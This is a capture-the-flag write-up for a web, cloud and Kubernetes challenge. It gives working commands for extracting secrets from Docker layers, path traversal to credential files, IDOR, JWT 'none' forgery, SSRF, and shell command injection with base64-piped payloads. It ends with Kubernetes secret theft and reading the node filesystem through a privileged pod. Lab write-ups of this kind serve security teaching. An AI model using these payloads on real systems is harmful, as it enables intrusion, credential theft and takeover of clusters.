# Break the SaaS (hamCTF) — solution notes

**Category:** Web / Cloud / Kubernetes  
**Flags covered:** F1–F10

## 1) Docker did not really remove the secret

I started with the container image because the registry allowed anonymous pulls. The interesting detail was the way the image had been built: `.env` was added in one step and removed in another one.

An image is a stack of read-only layers. A later layer can hide a file, but the layer that originally stored the file is still downloadable. I requested a Harbor pull token and used it to inspect the `backend` image.

```bash
REGISTRY='https://hub.hamdocker.ir'
REPOSITORY='seoeh/hamamooz_challlenges'

TOKEN=$(curl -sk \
  "$REGISTRY/v2/token?service=harbor-registry&scope=repository:$REPOSITORY:pull" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')

curl -sk -H "Authorization: Bearer $TOKEN" \
  -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' \
  "$REGISTRY/v2/$REPOSITORY/manifests/backend" \
  | jq -r '.layers[] | [.size, .digest] | @tsv'
```

After checking the small layers, I found `app/.env` in this blob:

```bash
DIGEST='sha256:cad298f9538d92ea9901f8de6c41611a63d62c56e914c9bd802ff01080456041'

curl -sk -H "Authorization: Bearer $TOKEN" \
  "$REGISTRY/v2/$REPOSITORY/blobs/$DIGEST" \
  | tar xzO app/.env
```

The output contained F1.

## 2) Swagger contained a flag

Next I checked the usual documentation paths. `/swagger.json` was open without a login. Besides showing the API routes, its `info.description` value included F2.

```bash
curl -sk 'https://ctf.seoeh.ir/swagger.json' | jq -r '.info.description'
```

This schema was also useful because it exposed `/api/internal/flag`, which was not linked from the site.

## 3) The “internal” endpoint only wanted a header

The route found in Swagger did not check a user account or token. Its only condition was the value of `X-Debug-Mode`. Since request headers are controlled by the client, I could set it myself.

```bash
curl -sk 'https://ctf.seoeh.ir/api/internal/flag' \
  -H 'X-Debug-Mode: true'
```

That returned F3 as JSON.

## 4) Walking out of the reports folder

The download route expected a file under `/app/reports`, but it accepted `..` path components. I first asked for the parent directory to see what was there:

```bash
curl -skG 'https://ctf.seoeh.ir/api/reports/download' \
  --data-urlencode 'file=..'
```

`flag.txt` appeared one level above the intended folder, so the next request was:

```bash
curl -skG 'https://ctf.seoeh.ir/api/reports/download' \
  --data-urlencode 'file=../flag.txt'
```

That gave me F4. At this point the bug was clearly an arbitrary file read, not just a way to fetch one flag. Two other paths were especially useful:

```bash
# Process environment
curl -skG 'https://ctf.seoeh.ir/api/reports/download' \
  --data-urlencode 'file=../../../proc/1/environ' \
  | tr '\0' '\n'

# Kubernetes identity token used by the backend pod
curl -skG 'https://ctf.seoeh.ir/api/reports/download' \
  --data-urlencode \
  'file=../../../var/run/secrets/kubernetes.io/serviceaccount/token'
```

The second file became important once I started calling the Kubernetes API.

## 5) Changing IDs exposed another tenant's data

The organization report URL used two numbers, but the API did not verify that the caller belonged to the requested organization. I tried a small range of IDs and got a real report at organization 2, report 2.

```bash
curl -sk 'https://ctf.seoeh.ir/api/orgs/2/reports/2' | jq .
```

F5 was in the `secret_note` field. This is an IDOR: the object exists, but the server forgets to check whether the current user is allowed to read it.

## 6) Creating an admin JWT with no signature

The JWT handler accepted a token whose header selected the `none` algorithm. That meant I could write my own payload and leave the signature part empty.

I made a token with an admin role using only Python's standard library:

```bash
ADMIN_JWT=$(python3 - <<'PY'
import base64
import json

def jwt_part(data):
    raw = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

head = jwt_part({"typ": "JWT", "alg": "none"})
body = jwt_part({"sub": "1", "role": "admin"})
print(f"{head}.{body}.")
PY
)

curl -sk 'https://ctf.seoeh.ir/admin/dashboard' \
  -H "Authorization: Bearer $ADMIN_JWT"
```

The dashboard trusted the unsigned claims and included F6 in its response.

## 7) Turning the webhook feature into an internal proxy

The webhook tester accepted a URL and fetched it from the backend. There was no useful restriction on where it could connect, so I pointed it at the admin service's Kubernetes DNS name.

```bash
curl -sk 'https://ctf.seoeh.ir/api/webhooks/test' \
  -X POST \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "method": "GET",
    "url": "http://admin-panel.internal-tools.svc.cluster.local/"
  }'
```

The public API fetched the private page and sent its HTML back to me. F7 was placed in an HTML comment. This was the SSRF part of the challenge.

## 8) Using the pod's account to fetch a Kubernetes Secret

The token read during F4 belonged to the backend's Kubernetes service account. That account had much more access than the application needed, including permission to read the Secret named `flag-secret` in `ctf-secrets`.

For this request I ran Python inside the backend pod through the command injection described in F9. I stored the Python program in a shell variable and base64-encoded it so that quotes and newlines would survive the JSON request.

```bash
READ_SECRET='python3 << "PY"
import base64
import json
import ssl
import urllib.request

token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
token = open(token_path).read().strip()

url = (
    "https://kubernetes.default.svc/api/v1/namespaces/"
    "ctf-secrets/secrets/flag-secret"
)
request = urllib.request.Request(
    url,
    headers={"Authorization": "Bearer " + token},
)

tls = ssl._create_unverified_context()
data = json.load(urllib.request.urlopen(request, context=tls, timeout=10))
print(base64.b64decode(data["data"]["flag"]).decode())
PY'

ENCODED=$(printf '%s' "$READ_SECRET" | base64 | tr -d '\n')

curl -sk 'https://ctf.seoeh.ir/api/diag/ping' \
  -X POST \
  -H 'Content-Type: application/json' \
  -d "{\"host\":\"127.0.0.1; echo $ENCODED | base64 -d | sh\"}"
```

Kubernetes stores the contents of Secret fields as base64 text, so the last Python line decodes the value and prints F8.

## 9) The ping input was passed straight to a shell

The diagnostic route did not call `ping` with a safe argument list. It built one string from the submitted host and executed that string with a shell. In simplified form, the code behaved like this:

```python
subprocess.run(f"ping -c 2 {host}", shell=True)
```

A semicolon starts another shell command, so I added `cat` after a valid IP address. The flag path was visible while inspecting the Python bytecode from the image.

```bash
curl -sk 'https://ctf.seoeh.ir/api/diag/ping' \
  -X POST \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "host": "127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"
  }'
```

The endpoint copied the shell output into its JSON response, which gave me F9. The same injection was the entry point for the Kubernetes commands used for F8 and F10.

## 10) Reaching the node filesystem through `legacy-worker`

The last confirmed flag was inside the Kubernetes node filesystem. The `legacy-worker` pod made it reachable because it had two dangerous settings: the container was privileged, and the node's `/` directory was mounted inside it at `/host`.

The backend service account could execute commands in that pod. Since `kubectl` was already installed in the backend image, I used the token mounted there and ran `cat` in `legacy-worker`.

```bash
NODE_READ='SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl \
  --server=https://kubernetes.default.svc \
  --token="$SA" \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  exec --namespace escape-zone legacy-worker -- \
  cat /host/var/lib/node-data/flag.txt'

ENCODED=$(printf '%s' "$NODE_READ" | base64 | tr -d '\n')

curl -sk 'https://ctf.seoeh.ir/api/diag/ping' \
  -X POST \
  -H 'Content-Type: application/json' \
  -d "{\"host\":\"127.0.0.1; echo $ENCODED | base64 -d | sh\"}"
```

The request went to the backend first. From there, `kubectl exec` entered `legacy-worker`, where the host-mounted path exposed the file containing F10.
